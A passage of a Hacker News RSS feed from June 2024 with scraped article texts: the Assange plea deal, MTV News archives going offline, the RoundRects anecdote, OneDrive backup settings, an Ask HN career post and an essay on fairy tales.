            <title><![CDATA[Julian Assange has reached a plea deal with the U.S., allowing him to go free (2177 pts)]]></title>
            <link>https://www.nbcnews.com/politics/justice-department/julian-assange-reached-plea-deal-us-allowing-go-free-rcna158695</link>
            <guid>40782130</guid>
            <pubDate>Mon, 24 Jun 2024 23:10:07 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.nbcnews.com/politics/justice-department/julian-assange-reached-plea-deal-us-allowing-go-free-rcna158695">https://www.nbcnews.com/politics/justice-department/julian-assange-reached-plea-deal-us-allowing-go-free-rcna158695</a>, See on <a href="https://news.ycombinator.com/item?id=40782130">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>WASHINGTON — <a href="https://www.nbcnews.com/news/world/wikileaks-julian-assange-extradition-appeal-espionage-london-court-rcna153007" target="_blank">WikiLeaks founder Julian Assange</a> plans to plead guilty to a conspiracy charge this week as part of a plea deal with the U.S. Justice Department that will allow him to go free after spending five years in a British prison, according to <a href="https://storage.courtlistener.com/recap/gov.uscourts.nmid.6474/gov.uscourts.nmid.6474.1.0.pdf" target="_blank">court documents</a>.</p><p>Assange was charged by criminal information — which typically signifies a plea deal — with conspiracy to obtain and disclose national defense information, the court documents say. A <a href="https://storage.courtlistener.com/recap/gov.uscourts.nmid.6474/gov.uscourts.nmid.6474.3.0_1.pdf" target="_blank">letter</a> from Justice Department official Matthew McKenzie to U.S. District Judge Ramona Manglona of the U.S. District Court for the Northern Mariana Islands said that Assange would appear in court at 9 a.m. local time on Wednesday (or, 7 p.m. ET on Tuesday) to plead guilty and said that DOJ expects Assange will return to Australia, his country of citizenship, after the proceedings.</p><p>U.S. charges against Assange stem from one of the largest publications of classified information in American history, which took place during the first term of Barack Obama's presidency. Starting in late 2009, according to the government, Assange conspired with <a href="https://www.nbcnews.com/news/us-news/judge-orders-chelsea-manning-be-released-n1157381" target="_blank">Chelsea Manning</a>, a military intelligence analyst, to disclose tens of thousands of activity reports about the war in Afghanistan, hundreds of thousands of reports about the war in Iraq, hundreds of thousands of State Department cables and assessment briefs of Guantanamo Bay detainees using his WikiLeaks website.</p><p>Court documents revealing Assange's plea deal were filed Monday evening in the U.S. District Court for the Northern Mariana Islands, a U.S. territory in the Pacific Ocean. Assange was expected to make an appearance in that court and to be sentenced to 62 months, with credit for time served in British prison, meaning he would be free to return to Australia, where he was born.</p><p>Assange has been <a href="https://www.nbcnews.com/news/world/wikileaks-julian-assange-extradition-appeal-espionage-london-court-rcna153007" target="_blank">held</a> in the high-security Belmarsh Prison on the outskirts of London for five years and previously spent seven years in self-exile at the Ecuadorian Embassy in London — <a href="https://www.nbcnews.com/news/world/wikileaks-founder-julian-assange-fathered-two-children-embassy-partner-says-n1182151" target="_blank">where he reportedly fathered two children</a> — until his asylum was withdrawn and he was forcibly <a href="https://www.nbcnews.com/news/world/wikileaks-founder-julian-assange-arrested-police-london-n991236" target="_blank">carried out of the embassy</a> and arrested in April 2019. A <a href="https://www.nbcnews.com/news/us-news/wikileaks-founder-julian-assange-indicted-new-charges-under-espionage-act-n1009441" target="_blank">superseding indictment</a> was returned against Assange more than five years ago, in May 2019, and a second superseding indictment was <a href="https://www.justice.gov/opa/pr/wikileaks-founder-charged-superseding-indictment" target="_blank">returned</a> in June 2020.</p><figure><picture data-testid="picture"><source media="(min-width: 1000px)" srcset="https://media-cldnry.s-nbcnews.com/image/upload/t_fit-560w,f_avif,q_auto:eco,dpr_2/rockcms/2022-06/220617-julian-assange-mb-1023-51469d.jpg 2x, https://media-cldnry.s-nbcnews.com/image/upload/t_fit-560w,f_auto,q_auto:best/rockcms/2022-06/220617-julian-assange-mb-1023-51469d.jpg 1x"><source srcset="https://media-cldnry.s-nbcnews.com/image/upload/t_fit-760w,f_avif,q_auto:eco,dpr_2/rockcms/2022-06/220617-julian-assange-mb-1023-51469d.jpg 2x, https://media-cldnry.s-nbcnews.com/image/upload/t_fit-760w,f_auto,q_auto:best/rockcms/2022-06/220617-julian-assange-mb-1023-51469d.jpg 1x"><img loading="lazy" src="https://media-cldnry.s-nbcnews.com/image/upload/t_fit-760w,f_auto,q_auto:best/rockcms/2022-06/220617-julian-assange-mb-1023-51469d.jpg" alt="Sweden Announce That They Are Dropping Rape Charges Against Julian Assange" height="2000" width="3000"></picture><figcaption data-testid="caption"><span data-testid="caption__container">Julian Assange speaks to the media from the balcony of the Embassy Of Ecuador on May 19, 2017 in London.</span><span data-testid="caption__source">Jack Taylor / Getty Images file</span></figcaption></figure><p>Assange has been fighting extradition to the U.S. for more than a decade. In March, the High Court in London <a href="https://www.nbcnews.com/news/world/julian-assange-wikileaks-win-appeal-extradition-us-spy-charges-rcna139519" target="_blank">gave him permission</a> for a full hearing on his appeal as he sought assurances that he could rely upon the First Amendment at a trial in the United States. In May, two judges on the High Court <a href="https://www.nbcnews.com/news/world/wikileaks-julian-assange-extradition-appeal-espionage-london-court-rcna153007" target="_blank">said</a> he could have a full hearing on whether he would be discriminated against in the U.S. because he is a foreign national. A hearing on the issue of Assange's free speech rights had been <a href="https://www.nbcnews.com/news/world/wikileaks-assange-extradition-appeal-heard-month-rcna156499" target="_blank">scheduled</a> for July 9-10.</p><p>Assange's WikiLeaks also <a href="https://www.nbcnews.com/news/us-news/wikileaks-julian-assange-no-proof-hacked-dnc-emails-came-russia-n616541" target="_blank">published</a> hacked emails from the Democratic National Committee that upended the 2016 presidential race. Russian intelligence officers were subsequently <a href="https://www.nbcnews.com/news/us-news/mueller-charges-russian-intelligence-officers-hacking-dnc-clinton-n891236" target="_blank">indicted</a> in connection with the hacking in 2018, in a case brought by then-special counsel Robert Mueller. At a joint news conference with then-President Donald Trump and Russian President Vladimir Putin days later, Trump contradicted the indictment and the intelligence community, saying that Putin was "<a href="https://www.nbcnews.com/politics/white-house/trump-putin-questions-abound-ahead-helsinki-meeting-n891606" target="_blank">extremely strong and powerful in his denial</a>" that Russians interfered in the 2016 election to help him win.</p><p>Manning was sentenced to 35 years in a military prison, but <a href="https://www.nbcnews.com/news/us-news/president-obama-commutes-chelsea-manning-s-sentence-n708046" target="_blank">her sentence was commuted by Obama</a> in the final days of his presidency in 2017. Manning was subsequently held in contempt of court for nearly a year after she refused to answer questions for a grand jury; she was then <a href="https://www.nbcnews.com/news/us-news/judge-orders-chelsea-manning-be-released-n1157381" target="_blank">released</a> after an <a href="https://www.nbcnews.com/politics/politics-news/chelsea-manning-hospitalized-after-suicide-attempt-n1156111" target="_blank">attempted suicide</a>.</p><p><em>If you or someone you know is in crisis, call&nbsp;or text</em><strong><em>&nbsp;</em></strong><em>988 to reach the Suicide and Crisis Lifeline&nbsp;or chat live at&nbsp;</em><a href="http://988lifeline.org/" target="_blank"><em>988lifeline.org</em></a><em>. You can also visit&nbsp;</em><a href="http://speakingofsuicide.com/resources" target="_blank"><em>SpeakingOfSuicide.com/resources</em></a><em>&nbsp;for additional&nbsp;support.</em></p></div><div><div data-activity-map="expanded-byline-article-bottom"><div data-testid="byline-thumbnail"><picture data-testid="picture"><source srcset="https://media-cldnry.s-nbcnews.com/image/upload/t_focal-60x60,f_avif,q_auto:eco,dpr_2/newscms/2020_02/3181661/michael-kosnar-circle-byline-template.jpg 2x, https://media-cldnry.s-nbcnews.com/image/upload/t_focal-60x60,f_auto,q_auto:best/newscms/2020_02/3181661/michael-kosnar-circle-byline-template.jpg 1x"><img loading="lazy" src="https://media-cldnry.s-nbcnews.com/image/upload/t_focal-60x60,f_auto,q_auto:best/newscms/2020_02/3181661/michael-kosnar-circle-byline-template.jpg" alt="" height="48" width="48"></picture></div><p><span data-testid="byline-name">Michael Kosnar</span><span></span></p><p>Michael Kosnar is a&nbsp;Justice Department producer for the NBC News Washington Bureau.</p></div><div data-activity-map="expanded-byline-article-bottom"><div data-testid="byline-thumbnail"><a href="https://www.nbcnews.com/author/ryan-j-reilly-ncpn1288345"><picture data-testid="picture"><source srcset="https://media-cldnry.s-nbcnews.com/image/upload/t_focal-60x60,f_avif,q_auto:eco,dpr_2/newscms/2024_06/3638200/newnbcheadshot.jpg 2x, https://media-cldnry.s-nbcnews.com/image/upload/t_focal-60x60,f_auto,q_auto:best/newscms/2024_06/3638200/newnbcheadshot.jpg 1x"><img loading="lazy" src="https://media-cldnry.s-nbcnews.com/image/upload/t_focal-60x60,f_auto,q_auto:best/newscms/2024_06/3638200/newnbcheadshot.jpg" alt="" height="48" width="48"></picture></a></div><p><span data-testid="byline-name"><a href="https://www.nbcnews.com/author/ryan-j-reilly-ncpn1288345">Ryan J. Reilly</a></span><span><a href="https://twitter.com/ryanjreilly" target="_blank" rel="noopener noreferrer"><span></span></a><a href="mailto:ryan.reilly@nbcuni.com" target="_blank" rel="noopener noreferrer"><span></span></a></span></p><p>Ryan J. Reilly is a justice reporter for NBC News.</p></div><div><p>Daniel Barnes</p><!-- --> <!-- --><p>contributed</p><!-- --><p>.</p></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[MTV news website goes dark, archives pulled offline (191 pts)]]></title>
            <link>https://variety.com/2024/digital/news/mtv-news-website-archives-pulled-offline-1236047163/</link>
            <guid>40782101</guid>
            <pubDate>Mon, 24 Jun 2024 23:06:22 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://variety.com/2024/digital/news/mtv-news-website-archives-pulled-offline-1236047163/">https://variety.com/2024/digital/news/mtv-news-website-archives-pulled-offline-1236047163/</a>, See on <a href="https://news.ycombinator.com/item?id=40782101">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>
	More than two decades’ worth of content published on MTVNews.com is no longer available after MTV appears to have fully pulled down the site and its related content. Content on its sister site, CMT.com, seems to have met a similiar fate. </p>



<p>
	In 2023, <a href="https://variety.com/2023/tv/news/mtv-news-shuts-down-paramount-layoffs-showtime-networks-1235607638/">MTV News was shuttered amid the financial woes</a> of parent company <a href="https://variety.com/t/paramount-global/" id="auto-tag_paramount-global" data-tag="paramount-global">Paramount Global</a>. As of Monday, trying to access <a href="https://variety.com/t/mtv-news/" id="auto-tag_mtv-news" data-tag="mtv-news">MTV News</a> articles on mtvnews.com or mtv.com/news resulted in visitors being redirected to the main MTV website.</p>



<p>
	The now-unavailable content includes decades of music journalism comprising thousands of articles and interviews with countless major artists, dating back to the site’s launch in 1996. Perhaps the most significant loss is MTV News’ vast hip-hop-related archives, particularly its weekly “Mixtape Monday” column, which ran for nearly a decade in the 2000s and 2010s and featured interviews, reviews and more with many artists, producers and others early in their careers.  

	</p>






<p>
	Former MTV News staffers posted on social media about the website shutdown and the scrubbing of the archives. “So, mtvnews.com no longer exists. Eight years of my life are gone without a trace,” Patrick Hosken, former music editor for MTV News, <a rel="noreferrer noopener nofollow" href="https://x.com/patrickhosken/status/1805327863882956850" target="_blank">wrote</a> on X. “All because it didn’t fit some executives’ bottom lines. Infuriating is too small a word.” 


</p><div>
			<h3>
			Popular on Variety		</h3>
	
		
	</div>




<p>
	“sickening (derogatory) to see the entire @mtvnews archive wiped from the internet,” Crystal Bell, culture editor at Mashable and one-time entertainment director&nbsp;of MTV News, <a rel="noreferrer noopener nofollow" href="https://x.com/crystalbell/status/1805338895401599275" target="_blank">posted</a> on X. “decades of music history gone…including some very early k-pop stories.”</p>



<p>
	“This is disgraceful. They’ve completely wiped the MTV News archive,” longtime Rolling Stone senior writer Brian Hiatt <a href="https://x.com/hiattb/status/1805336821569896551" target="_blank" rel="noreferrer noopener nofollow">commented</a>. “Decades of pop culture history research material gone, and why?”</p>



<p>
	Last week, Paramount Global’s CMT website similarly pulled its repository of country-music journalism dating back several decades.</p>



<p>
	Reps for MTV did not respond to requests for comment Monday.</p>



<p>
	Some observers noted that MTV News articles may be available through internet archiving services like the <a rel="noreferrer noopener nofollow" href="https://wayback-api.archive.org/" target="_blank">Wayback Machine</a>, but according to Hiatt older MTV News articles do not show up via Wayback Machine.</p>



<p>
	In May 2023, Paramount Global shut down MTV News — which had already been severely downsized by layoffs in recent years — coming amid a <a href="https://variety.com/2023/tv/news/mtv-news-shuts-down-paramount-layoffs-showtime-networks-1235607638/">25% reduction in workforce</a> across the Showtime/MTV Entertainment Studios and Paramount Media Networks groups in the U.S. The group is headed by president-CEO Chris McCarthy, who in late April was named one of <a href="https://variety.com/2024/biz/news/paramount-ceos-skydance-deal-end-standalone-strategic-plan-1236035440/">the three co-CEOs running Paramount Global’s “Office of the CEO.”</a>

	</p>




<p>
	MTV News began in the late ’80s with “The Week in Rock,” a show hosted by Kurt Loder, who was the first MTV News correspondent.</p>



<p>
	<em>Additional reporting by Jem Aswad, a former MTV News editor. </em></p>




















</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Round Rects Are Everywhere (359 pts)]]></title>
            <link>https://www.folklore.org/Round_Rects_Are_Everywhere.html</link>
            <guid>40781838</guid>
            <pubDate>Mon, 24 Jun 2024 22:38:31 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.folklore.org/Round_Rects_Are_Everywhere.html">https://www.folklore.org/Round_Rects_Are_Everywhere.html</a>, See on <a href="https://news.ycombinator.com/item?id=40781838">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<p>Bill Atkinson worked mostly at home, but whenever he made significant progress he rushed in to Apple to show it off to anyone who would appreciate it.   This time, he visited the Macintosh offices at Texaco Towers to show off his brand new oval routines, which were implemented using a really clever algorithm.</p><p>

	Bill had added new code to QuickDraw (which was still called LisaGraf at this point) to draw circles and ovals very quickly.  That was a bit hard to do on the Macintosh, since the math for circles usually involved taking square roots, and the 68000 processor in the Lisa and Macintosh didn't support floating point operations.  But Bill had come up with a clever way to do the circle calculation that only used addition and subtraction, not even multiplication or division, which the 68000 could do, but was kind of slow at.</p><p>

	Bill's technique used the fact the sum of a sequence of odd numbers is always the next perfect square (For example, 1 + 3 = 4, 1 + 3 + 5 = 9, 1 + 3 + 5 + 7 = 16, etc).  So he could figure out when to bump the dependent coordinate value by iterating in a loop until a threshold was exceeded.  This allowed QuickDraw to draw ovals very quickly.</p><p>

	Bill fired up his demo and it quickly filled the Lisa screen with randomly-sized ovals, faster than you thought was possible.  But something was bothering Steve Jobs.  "Well, circles and ovals are good, but how about drawing rectangles with rounded corners?  Can we do that now, too?"</p><p>

	"No, there's no way to do that.  In fact it would be really hard to do, and I don't think we really need it".  I think Bill was a little miffed that Steve wasn't raving over the fast ovals and still wanted more.</p><p>

	Steve suddenly got more intense.  "Rectangles with rounded corners are everywhere! Just look around this room!". And sure enough, there were lots of them, like the whiteboard and some of the desks and tables.  Then he pointed out the window.  "And look outside, there's even more, practically everywhere you look!".  He even persuaded Bill to take a quick walk around the block with him, pointing out every rectangle with rounded corners that he could find.</p><p>

        When Steve and Bill passed a no-parking sign with rounded corners, it did the trick.  "OK, I give up", Bill pleaded.  "I'll see if it's as hard as I thought."  He went back home to work on it.</p><p>

        Bill returned to Texaco Towers the following afternoon, with a big smile on his face.  His demo was now drawing rectangles with beautifully rounded corners blisteringly fast, almost at the speed of plain rectangles.  When he added the code to LisaGraf, he named the new primitive "RoundRects".   Over the next few months, roundrects worked their way into various parts of the user interface, and soon became indispensable.
  </p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Fearing losses, banks are quietly dumping real estate loans (112 pts)]]></title>
            <link>https://www.nytimes.com/2024/06/24/business/commercial-real-estate-loans.html</link>
            <guid>40781060</guid>
            <pubDate>Mon, 24 Jun 2024 21:32:20 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.nytimes.com/2024/06/24/business/commercial-real-estate-loans.html">https://www.nytimes.com/2024/06/24/business/commercial-real-estate-loans.html</a>, See on <a href="https://news.ycombinator.com/item?id=40781060">Hacker News</a></p>
Couldn't get https://www.nytimes.com/2024/06/24/business/commercial-real-estate-loans.html: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Windows 11 is now enabling OneDrive folder backup without asking permission (289 pts)]]></title>
            <link>https://www.neowin.net/news/windows-11-is-now-automatically-enabling-onedrive-folder-backup-without-asking-permission/</link>
            <guid>40781048</guid>
            <pubDate>Mon, 24 Jun 2024 21:30:43 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.neowin.net/news/windows-11-is-now-automatically-enabling-onedrive-folder-backup-without-asking-permission/">https://www.neowin.net/news/windows-11-is-now-automatically-enabling-onedrive-folder-backup-without-asking-permission/</a>, See on <a href="https://news.ycombinator.com/item?id=40781048">Hacker News</a></p>
<div id="readability-page-1" class="page"><div itemprop="articleBody">
                                                                        <p><img alt="The Microsoft OneDrive Logo" src="https://cdn.neowin.com/news/images/uploaded/2022/03/1648728320_onedrive_logo_story.jpg"></p>

<p>Microsoft has made OneDrive slightly more annoying for Windows 11 users. Quietly and without any announcement, the company changed Windows 11's initial setup so that it could turn on the automatic folder backup without asking for it.</p>

<p>Now, those setting up a new Windows computer <a href="https://www.neowin.net/news/microsoft-apparently-hates-it-when-you-switch-from-microsoft-account-to-local-account/">the way Microsoft wants them to</a> (in other words, connected to the internet and signed into a Microsoft account) will get to their desktops with OneDrive already syncing stuff from folders like Desktop Pictures, Documents, Music, and Videos. Depending on how much is stored there, you might end up with a desktop and other folders filled to the brim with shortcuts to various stuff right after finishing a clean Windows installation.</p>

<p><a href="https://support.microsoft.com/en-us/office/back-up-your-folders-with-onedrive-d61a7930-a6fb-4b95-b28a-6552e77c3057">Automatic folder backup in OneDrive</a> is a very useful feature when used properly and when the user deliberately enables it. However, Microsoft decided that sending a few notification prompts to enable folder backup was not enough, so it just turned the feature on without asking anybody or even letting users know about it, resulting in a flood of Reddit posts about users complaining about what the hell are those green checkmarks next to files and shortcuts on their desktops.</p>

                            <!-- PLACE THIS SECTION INSIDE OF YOUR BODY WHERE YOU WANT THE VIDEO PLAYER TO RENDER -->
            <p>If you do not want your computer to back up everything on your desktop or other folders, here is how to turn the feature off (you can also set up Windows 11 in offline mode):</p>

<ol>
<li>Right-click the OneDrive icon in the tray area, click the settings icon and then press Settings.</li>
	<li>Go to the "Sync and Backup" tab and click "Manage backup."</li>
	<li>Turn off all the folders you do not want to back up in OneDrive and confirm the changes.</li>
	<li>If you have an older OneDrive version with the classic tabbed interface, go to the Backup tab and click Manage Backup &gt; Stop backup &gt; Stop backup.</li>
</ol>
<p>Microsoft is no stranger to shady tricks with its software and operating system. Several months ago, we noticed that <a href="https://www.neowin.net/news/microsoft-wont-let-you-close-onedrive-in-windows-without-you-explaining-it-first/">OneDrive would not let you close it</a> without you explaining the reason first (<a href="https://www.neowin.net/news/microsoft-backtracks-no-longer-asks-to-explain-closing-onedrive-on-windows-10-and-11/">Microsoft later reverted that stupid change</a>). A similar thing <a href="https://www.neowin.net/news/microsoft-now-wants-you-to-take-a-poll-before-installing-google-chrome/">was also spotted in the Edge browser</a>, with Microsoft asking users why they downloaded Chrome.</p>

<p>As a reminder, you can always just uninstall OneDrive and call it a day.</p>
                        
                        
                                                                    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[HNInternal: Ask HN: Those of you who've left the SWE world, what did you transition into? (165 pts)]]></title>
            <link>https://news.ycombinator.com/item?id=40780940</link>
            <guid>40780940</guid>
            <pubDate>Mon, 24 Jun 2024 21:20:31 GMT</pubDate>
            <description><![CDATA[<p>See on <a href="https://news.ycombinator.com/item?id=40780940">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><td><table>
        <tbody><tr id="40780940">
      <td><span></span></td>      <td><center><a id="up_40780940" href="https://news.ycombinator.com/vote?id=40780940&amp;how=up&amp;goto=item%3Fid%3D40780940"></a></center></td><td><span><a href="https://news.ycombinator.com/item?id=40780940">Ask HN: Those of you who've left the SWE world, what did you transition into?</a></span></td></tr><tr><td colspan="2"></td><td><span>
          <span id="score_40780940">111 points</span> by <a href="https://news.ycombinator.com/user?id=volkk">volkk</a> <span title="2024-06-24T21:20:31"><a href="https://news.ycombinator.com/item?id=40780940">1 hour ago</a></span> <span id="unv_40780940"></span> | <a href="https://news.ycombinator.com/hide?id=40780940&amp;goto=item%3Fid%3D40780940">hide</a> | <a href="https://hn.algolia.com/?query=Ask%20HN%3A%20Those%20of%20you%20who%27ve%20left%20the%20SWE%20world%2C%20what%20did%20you%20transition%20into%3F&amp;type=story&amp;dateRange=all&amp;sort=byDate&amp;storyText=false&amp;prefix&amp;page=0">past</a> | <a href="https://news.ycombinator.com/fave?id=40780940&amp;auth=3511ccde47c8132520424864bc4703492fda6643">favorite</a> | <a href="https://news.ycombinator.com/item?id=40780940">75&nbsp;comments</a>        </span>
              </td></tr>
    <tr><td></td></tr><tr><td colspan="2"></td><td><div><p>After 13 years in SWE, working for startups, bigger companies, the golden handcuffs, etc, I can finally say that I think I'm finished.</p><p>Right now I'm contracting to stay afloat, maintain flexibility and delve into entrepreneurship, but I truly don't know what the future holds for me anymore if building my own company doesn't work out. I have 0 inclination to go back to a 9-5 at a company coding for a living. I'm done. I've been an EM, which might arguably be the most miserable position that exists. I've been senior/staff at places, and honestly I just don't enjoy arguing about the structure of software anymore, I'm tired of the personalities, tired of the infantilization of the industry (frankly, it's embarrassing) but mostly, I just don't enjoy coding as much as I used to, unless I'm leveraging it to create an asymmetrical amount of value for me ($$$$) which is just not what a full time job is.</p><p>However, I don't know what to look into as an alternative if I need a full time position once my wife and I start having kids. My strengths revolve around people and strategy. I've been considering sales at a tech company because to me, working harder and having an unlimited cap in what I can earn sounds pretty fantastic.</p><p>Would love to hear any kinds of stories or tips from folks</p></div></td></tr>        <tr><td></td></tr><tr><td colspan="2"></td><td><form action="comment" method="post"></form></td></tr>  </tbody></table>
  </td></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The case for not sanitising fairy tales (213 pts)]]></title>
            <link>https://www.plough.com/en/topics/culture/literature/the-case-for-not-sanitizing-fairy-tales</link>
            <guid>40779785</guid>
            <pubDate>Mon, 24 Jun 2024 19:35:52 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.plough.com/en/topics/culture/literature/the-case-for-not-sanitizing-fairy-tales">https://www.plough.com/en/topics/culture/literature/the-case-for-not-sanitizing-fairy-tales</a>, See on <a href="https://news.ycombinator.com/item?id=40779785">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<p><span>During Flannery O’Connor’s</span> childhood, the future author had a creative way of weeding out any unsatisfactory playmates who had been chosen by her mother as respectable society. O’Connor would read <em>Grimms’ Fairy Tales</em> aloud to her guests. Some were too frightened by the stories to ever return to the O’Connor house in Savannah (which suited their hostess just fine). Any girl who loved the fairy tales passed young O’Connor’s&nbsp;test. A kindred spirit had been found.</p>
<p>Classic fairy tales aren’t for the faint of heart. It’s not hard to see their influence on O’Connor’s disturbing and shocking southern gothic fiction that includes such horrors as serial killers waiting by the side of rural roads, ready to murder selfish grandmothers. The stories compiled by Jacob and Wilhelm Grimm include their fair share of violence and twisted crimes: men who chop young women up into pieces, a father who lusts after his own daughter, and many, many characters who make deals with the devil himself. Today children are often only familiar with sanitized versions of the Grimm Brothers’ stories.</p>
<div><p><img height="856" alt="illustration of Hansel and Gretel and a witch" width="600" src="https://www.plough.com/-/media/images/plough/article/2024/summer/stewart/stewartembed.jpg?la=en"></p><p>Arthur Rackham, Illustration of “Hansel and Gretel,” a well-known German folktale from the Brothers Grimm, 1909<em>.</em></p>
</div>
<p>Hans Christian Andersen’s classic fairy tales have also been adjusted over the years for a more sensitive audience. When I found his version of “The Little Mermaid”<em> </em>at the library as a young girl, I was surprised but fascinated by the stark differences from the Disney film. The prince in Andersen’s<em> </em>“The Little Mermaid” marries someone else. And the mermaid’s bargain with the sea-witch results in a desperate choice: die when the sun rises after his wedding night or murder her beloved in his bridal chamber. While there are moments of suspense and danger in Disney’s <em>The Little Mermaid</em>, it’s hard to imagine bubbly Ariel with her bouncing red bangs and a knife in hand, trying to decide whether to fatally stab lovable himbo Prince Eric. Such a dark scene, although not uncommon in the realm of classic fairy tales, would have been considered too distressing for young viewers. In an effort to make the story more palatable, Disney’s <em>Cinderella </em>does not include the details of Cinderella’s stepsisters chopping off their heels and toes to fit their bloody, mutilated feet into the glass slipper in greedy pursuit of the throne or getting their eyes pecked out by birds in a final stroke of justice, as the Grimms’ version describes. But is this Disneyfication of these tales a good or a bad thing?</p>
<p>Fairy tales are stories that are told to children and set in a world of magic. As twentieth-century educator <a href="https://www.plough.com/en/authors/a/annemarie-waechter-arnold">Annemarie Wächter</a>&nbsp;put it, “Children and fairy tales are inseparable – one cannot be imagined without the other.” Fairy tales are beloved by children partly because they are tales of <em>action</em>. Rather than revolving around the inner thoughts and motivations of nuanced characters, they are concerned with <em>what happens next</em>, what the characters (often archetypes) <em>do</em>. They are more than mere fables with a snappy moral (think Aesop) because their meaning transcends clearcut lessons. Instead, they are full of mystery. There is room inside these tales for the child to explore fairyland: a strange and dangerous world in which she can practice overcoming her fears by journeying alongside the hero. And at the end of the tale, everything is set right. As Wächter puts it, “Fairy tales can often be brutal and cruel – people and animals die – and yet, despite everything, the positive powers always win. There can be no other ending.”</p>
<p>Fairy tales take both evil and goodness quite seriously. In other words, they are truthful. As Madeleine L’Engle claimed, “The world of fairy tale, fantasy, myth, is inimical to the secular world, and in total opposition to it, for it is interested not in limited laboratory proofs, but in truth.” And in their embrace of truth, fairy tales wrestle with darkness and end in triumph. But are we willing to tell children the truth by reading them fairy tales, as Flannery O’Connor did to her playmates? It seems that these days we are more comfortable if we alter them either by&nbsp; softening the darkness in the story or, as we see in much young adult literature, rejecting the possibility of happily ever after.</p>
<p><span>Disney’s <em>Cinderella </em>does not include the details of Cinderella’s stepsisters chopping off their heels and toes to fit their bloody, mutilated feet into the glass slipper in greedy pursuit of the throne or getting their eyes pecked out by birds in a final stroke of justice, as the Grimms’ version describes. But is this Disneyfication of these tales a good or a bad thing?</span></p>
<p>While protecting the innocence of children by sheltering them from overly gruesome material is something all good parents seek to do, have we swung so far in our attempt to protect children that we don’t tell stories that help them process dark things? While we haven’t always been so leery of the violence in fairy tales, in this strange age we subject our children to drills at their schools to prepare them for active shooters in the classroom but consider them too fragile to be told stories that take evil and death seriously. Is this sheltering from the classic grit of fairy tales benefiting them, or are these just the sort of stories they need to be able to endure the violence that hangs like a shadow over our world?</p>
<p>The fairy tale acknowledges that parents do not always love and care for their children as they ought, that loved ones die and leave us alone and grieving, that evil is real and often powerful, and that violence and sin are present in our world. All these truths make grownups uncomfortable; we are eager to smooth over a child’s fears with comforting falsehoods. “Don’t worry, nothing is going to happen to me,” a mother might say when her child is distraught at the thought of her mortality. But the child knows that sometimes mothers die and his mother is no different. Children are wise enough to be afraid of death, loss, and danger – after all, these are frightening things. The question is whether we allow them to wrestle well with these fears or not. British writer G. K. Chesterton famously wrote, “The baby has known the dragon intimately ever since he had an imagination. What the fairy tale provides for him is a Saint George to kill the dragon.” If we spend our efforts trying to convince a child that the dragons of life can’t hurt him, we not only fail to tell the truth, we fail to show him that dragons do not have the last word. And the child longs to be equipped to face the monsters he fears, whether dragons or death.</p>
<p><span>While classic fairy tales</span> are maligned by some for being too realistic and unsettling in acknowledging the reality of evil, they are also criticized for being too<em> un</em>realistic for their final hopeful resolutions. “I won’t read my daughter fairy tales!” I’ve been told by concerned parents. “She might think Prince Charming is coming to save her and she’ll only be disappointed when she wakes up to the <em>real world</em>.” These critics are willing to leave the dragon in the story but want to remove Saint&nbsp;George. The endings of classic fairy tales are considered too rosy for a child’s consumption. Perhaps robbing young children of the world of fairyland where they can face the monsters they fear results in an inevitable overcorrection, as the explosion of dystopian YA fiction might suggest. Many such books see the world through a lens of despair, defeat, and mistrust, overrun with dragons with no Saint&nbsp;George in sight. A belief that despair is the only realistic response to the nature of the world leads to narratives like <em>Game of Thrones,</em> which presents a universe where there is neither good nor evil, just the unquenchable thirst for power that motivates every soul.</p>
<p>Even in stories for younger kids – A Series of Unfortunate Events, for example – we see the fairy tale turned on its head. In this series the orphaned Baudelaire children are never given the happily ever after they deserve. In <em>Grimms’ Fairy Tales</em> the heroes or heroines sometimes encounter helpers along the way, or they might meet manipulators or liars. In this they are realistic. And there is the understanding that the world is not merely dark; both good and evil people inhabit it, but there are some worth trusting. But the Baudelaires can trust no one. The adults they encounter are either too weak to help them or are secretly trying to harm them. Another trend of subverted fairy tale is the apologia for a villain, such as Disney’s <em>Maleficent, </em>in which the evil sorceress becomes the sympathetic victim. In these stories both evil <em>and</em> goodness are removed from the tale. The villain’s evil is explained away, the hero’s goodness revealed to be a farce. And yet, while these kinds of stories are undeniably popular, it is notable that the series that has recently captured the imagination of children (and even adults) most deeply is a modern fairy tale that includes both wrestling with evil and death and a happily ever after: J. K. Rowling’s Harry Potter<em>, </em>a story, like <em>Grimms’ Fairy Tales</em>, with an indisputably Christian framework.</p>
<p><span>Every human being</span> understands the world and his place in it through narratives. God wires us to be formed by story; Jesus himself tells parables to teach his disciples. It is of the highest importance that we consider what stories we are telling our young people. What character do they think they are in the story of their lives? And what kind of world is their story set in? Is it a world in which greed and power will be ultimately triumphant? Is it a world in which love and goodness hold any sway? Could the dread that seems to plague our young people be not merely a reaction to the brokenness of our world but our failure to communicate that the universe will ultimately be set right as both fairy tales and the gospel promise? After all, as the theologian Vigen Guroian beautifully puts it in his fantastic book <em><a rel="noopener noreferrer" href="https://bookshop.org/a/78/9780195384314" target="_blank">Tending the Heart of Virtue</a></em>, “Fairy tales lead us toward a belief in something that, if it were not also so veiled in a mystery, common sense alone would affirm: if there is a story, there must surely be a storyteller.” And in this lies our deepest hope.</p>
<p><spa>The fairy tale acknowledges that parents do not always love and care for their children as they ought, that loved ones die and leave us alone and grieving, that evil is real and often powerful, and that violence and sin are present in our world. All these truths make grownups uncomfortable; we are eager to smooth over a child’s fears with comforting falsehoods.</spa></p>
